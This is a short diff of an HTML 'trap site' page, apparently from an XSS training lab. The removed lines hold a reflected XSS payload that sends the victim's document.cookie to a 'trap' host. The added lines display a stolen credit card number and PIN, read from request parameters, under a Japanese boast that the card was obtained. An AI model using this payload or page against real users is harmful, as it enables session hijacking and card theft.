@@ -6,7 +6,8 @@
 </head>
 <body style="background-color: black; color: white;">
     <h1>罠サイト</h1>
-    <iframe src="http://localhost:8080/xss1?keyword=<script>window.location='http://trap:8080/trap/getCookie?sid='%2Bdocument.cookie;</script>">
-    </iframe>
+    <h2>あなたのクレジットカード番号を入手しました！</h2>
+    <div>カード番号：{{ params.credit[0] }}</div>
+    <div>暗証番号：{{ params.creditPassword[0] }}</div>
 </body>
 </html>
